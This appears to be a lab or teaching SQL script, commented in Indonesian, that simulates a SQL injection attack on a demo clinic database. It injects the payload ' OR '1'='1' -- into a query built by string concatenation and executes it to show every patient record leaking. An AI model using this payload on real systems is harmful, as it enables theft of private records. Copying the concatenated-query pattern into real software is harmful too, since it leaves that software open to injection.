USE klinik_db;

-- ========================================
-- SKENARIO 2A: SERANGAN SQL INJECTION
-- Simulasi query RENTAN (string concatenation)
-- ========================================

-- Payload injeksi
SET @nama_input = '\' OR \'1\'=\'1\' -- ';

-- Bangun query rentan via CONCAT (TIDAK AMAN)
SET @query_rentan = CONCAT('SELECT id, nama, tanggal_lahir FROM pasien WHERE nama = \'', @nama_input, '\'');

-- Tampilkan query yang terbentuk
SELECT '=== QUERY RENTAN YANG TERBENTUK ===' AS info;
SELECT @query_rentan AS query_yang_dieksekusi;

-- Eksekusi query rentan -> SELURUH DATA BOCOR
SELECT '=== HASIL EKSEKUSI (DATA BOCOR) ===' AS info;
PREPARE stmt_rentan FROM @query_rentan;
EXECUTE stmt_rentan;
DEALLOCATE PREPARE stmt_rentan;
